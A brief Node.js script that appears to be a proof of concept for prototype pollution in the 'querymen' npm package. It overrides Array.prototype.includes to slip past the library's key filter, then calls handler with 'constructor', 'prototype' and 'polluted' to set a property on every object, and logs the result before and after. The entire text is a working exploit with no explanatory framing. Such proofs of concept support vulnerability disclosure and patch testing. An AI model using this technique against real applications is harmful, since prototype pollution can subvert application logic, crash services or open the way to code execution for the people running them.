Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
var a = require('querymen');
obj = {};
console.log({}.polluted);
a.handler('constructor', 'prototype', 'polluted', 'yes');
console.log({}.polluted);